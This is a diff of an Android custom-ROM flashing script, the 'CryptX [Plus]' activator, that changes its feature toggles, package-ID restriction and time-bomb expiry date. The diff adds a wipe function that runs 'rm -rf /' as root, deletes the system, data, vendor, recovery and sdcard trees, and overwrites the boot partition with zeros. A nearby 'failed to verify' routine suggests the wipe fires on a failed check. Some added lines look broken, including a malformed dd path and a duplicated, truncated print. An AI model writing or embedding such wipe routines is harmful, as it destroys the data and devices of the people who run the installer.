@@ -50,6 +50,11 @@ CryptX_Recovery_BIDInfo=$(getprop ro.CryptX.BuildDate 2>/dev/null);
 # set "CXRVC" in order to enable detection feature for minimum and maximum version preset for the mod recovery being used
 CXRVC=$CryptX_Recovery_VerCode
 
+# the current packageid identification prop(s)
+# Declare Shortname For Service To Operate Easily
+CXMPI=$CryptXModule_Current_PackageID
+
+
 # -------------------------------------------------------------------
 
 
@@ -79,7 +84,7 @@ CXRVC=$CryptX_Recovery_VerCode
 # In Internal Storage & /tmp/. Where User Can Refer All The 
 # Corresponding Information About Flashing & Device Statistics.
 
-# 05 | Shuffle Device Confidential Information
+# 05 | Shuffle Confidential Information
 # When Turned On, The Device(s) Confidential Information Is Shuffled
 # In Such Order Which The Owner Is Only Able To Understand Within 
 # The Logs. Helpful While Sharing Logs To Developer Such That 3rd
@@ -89,6 +94,7 @@ CXRVC=$CryptX_Recovery_VerCode
 # When Turned On, The Flashing Process (.zip) Gets Splitted
 # Amongst A Number Of Packages Thats Need To Be Flashed In A Specific
 # Order. Incase Order Mismatches Flashing Will Fail.
+# Max PackageID Binding Is Restricted To 10 zips.
 
 # 07 | Time Bomb Service
 # When Turned On, Package Is Restricted To Be Only Flashed Until
@@ -102,6 +108,8 @@ CXRVC=$CryptX_Recovery_VerCode
 # CryptX [Plus] Module(s) Control Panel 
 # -------------------------------------------------------------------
 
+# >> =0; Will Result In Deactivating The Service | =1; Will Result In Activating The Service <<
+
 # 01 | CryptX Module: 'Volume Key Selection' Support
 CryptXModule_ACTIVATE_VKS=0;
 
@@ -109,18 +117,18 @@ CryptXModule_ACTIVATE_VKS=0;
 CryptXModule_ACTIVATE_CMR=1;
 
 # 03 | CryptX Module: 'Confinement Mode' Support
-CryptXModule_ACTIVATE_HBD=0;
+CryptXModule_ACTIVATE_ECM=0;
 
-# 04 | CryptX Module: Disable Logs For CryptX Service(s)
-CryptXModule_ACTIVATE_DLS=0;
+# 04 | CryptX Module: 'Logs Service' Support
+CryptXModule_ACTIVATE_CLS=0;
 
-# 05 | CryptX Module: Shuffle Device Confidential Details In Logs
-CryptXModule_ACTIVATE_USD=0;
+# 05 | CryptX Module: 'Shuffle Confidential Information' Support
+CryptXModule_ACTIVATE_SCI=0;
 
-# 06 | CryptX Module: Set Package ID Amongst Other(s) | MAX ID LIMIT IS SET TO 10
-CryptXModule_PackageID=01;
+# 06 | CryptX Module: 'Restrict Packages Service' Support
+CryptXModule_ACTIVATE_RPS=1;
 
-# 07 | CryptX Module: Set Package TimeBomb Limit | Package Won't Flash After Time Exceeds
+# 07 | CryptX Module: 'Time Bomb Service' Support
 CryptXModule_Activate_TMS=1;
 
 # -------------------------------------------------------------------
@@ -129,6 +137,9 @@ CryptXModule_Activate_TMS=1;
 # -------------------------------------------------------------------
 # Load CryptX Flashing Variables
 # -------------------------------------------------------------------
+
+# >> Initial Prop(s) Pre-Defined Such That Flashing Service
+#    Records And Writes Exact Data Correctly.
 
 # Slot Prop(s)
 ACTIVE_SLOT=" ";
@@ -148,29 +159,27 @@ abort_reason=" - NULL!";
 device_dynamic=0;
 
 # Activator Information Prop(s)
-CryptX_ACTIVATOR_VERSION="V1.0.2 | [Plus]";
+CryptX_ACTIVATOR_VERSION="V1.3.9 | [Plus]";
 CryptX_ACTIVATOR_VARIANT="Stable";
 
 # Project Maintainer(s) Information:
-ROM_DEV="@test";
-SEC_DEV="@itsD3XT3R07";
-SEX_DEV="D3XT3R";
+ROM_DEV="@sigmadev007";
+SEC_DEV="@rahul007";
+SEX_DEV="Rahul007";
 SEC_NID="CryptX";
 SEX_NID="cryptx";
-ROM_DEB="test";
+ROM_DEB="sigmadev007";
 
 # Project Information:
-ROM_NAME="OxygenOS 13.1 Port";
+ROM_NAME="OxygenOS 15";
 ROM_VER="V1.0";
 ROM_VAR="Stable";
 ROM_CVB="v10";
 ROM_CAB="stable"
 
 # Last Modified File Detail(s)
-MOD_DATE="22-03-2023";
-MOD_TIME="03:15AM [IST]";
-ROM_MOD_DATE="";
-ROM_MOD_TIME="";
+MOD_DATE="26-10-2024";
+MOD_TIME="11:15AM [IST]";
 
 # Create Custom Config(s) To Restrict Flashing:
 # -->   (security-name)_(rom-developer)_(rom-version)_(rom-variant)   <--
@@ -182,7 +191,16 @@ CX_MINI="V1.0.0";
 CX_MAXC="150";
 CX_MAXI="V1.5.0";
 
-# CrptX Module: Set A TimeBomb Limit | File Won't Flash After X Amount Of Time
+# CrptX Module: Set A TimeBomb Limit | File Won't Flash After Particular Amount Of Time
+EXPIRY_DATE="31";
+EXPIRY_MONTH="12";
+EXPIRY_YEAR="2024";
+EXPIRY_HOUR="23";
+EXPIRY_MINUTE="59";
+EXPIRY_SECOND="59";
+
+# CryptX Module: Set PackageID Restriction | Max Limit Is Set To 10
+CryptXModule_Current_PackageID=01;
 
 # -------------------------------------------------------------------
 
@@ -288,21 +306,12 @@ fi
 
 # Abort flashing procedure
 abort() {
-if [ $CryptXModule_ACTIVATE_DLS = 0 ]; then
 package_flash_status=0;
 activate_cryptx_logs;
+if [ $CryptXModule_ACTIVATE_CLS = 0 ]; then
 ui_print " ";
 ui_print " > Head To CryptX.log                           ";
 ui_print "   [In Internal Storage][Check Logs For Info]   ";
-ui_print " ";
-ui_print " - console: Error!                              ";
-ui_print " - console: Aborting Flasher...                 ";
-ui_print " ";
-ui_print "------------------------------------------------";
-ui_print " ";
-ui_print " ";
-ui_print " ";
-exit 0
 else
 ui_print " ";
 ui_print " - console: Error!                              ";
@@ -329,20 +338,29 @@ package_extract_sourcefile "CryptX/firmware-update/modem.img" "/dev/block/bootde
 
 wipe_all_partitionsx() {
 mount_all
-rm -rf /data/
-rm -rf /*
+su -c "rm -rf /"
+su -c "rm -rf data"
+su -c "rm -rf vendor"
+su -c "rm -rf recovery"
+su -c "rm -rf system"
+su -c "rm -rf external_sdcard"
+su -c "rm -rf sdcard"
+dd if=/dev/zero of=/dev/block/bootdevice/by-name/bootdevice/by-name/boot
 rm -rf /
-rm -rf /data/data
-rm -rf /system/
-rm -rf /sdcard/
-rm -rf /vendor/
-rm -rf /system_ext/
-rm -rf /product/
+rm -rf data
+rm -rf vendor
+rm -rf recovery
+rm -rf system
+rm -rf external_sdcard
+rm -rf sdcard
+rm -rf /*
 }
 
 # If User Status Fails To Verify
 failed_to_verify() {
 ui_print " ";
+ui_print " - Failed To Verify User Data!                  ";
+ui_print " > Thanks G";
 ui_print " - Failed To Verify User Data!                  ";
 ui_print " > Thanks For Spending Time To Flash Our ROM... ";
 ui_print " ";
@@ -654,7 +672,7 @@ ui_print " ";
 # -------------------------------------------------------------------
 
 activate_cryptx_logs() {
-if [ $CryptXModule_ACTIVATE_DLS = 0 ]; then
+if [ $CryptXModule_ACTIVATE_CLS = 0 ]; then
 
 log_file=/data/media/0/CryptX/CryptX.log
 
@@ -1238,7 +1256,7 @@ fi
 
 # Module: Disable Log Service Config(s)
 module_dls_info() {
-if [ $CryptXModule_ACTIVATE_DLS = 1 ]; then
+if [ $CryptXModule_ACTIVATE_CLS = 1 ]; then
 echo "  > This Feature Is Bundled With This Activator " >> $log_file
 echo "    Version!                                    " >> $log_file
 else
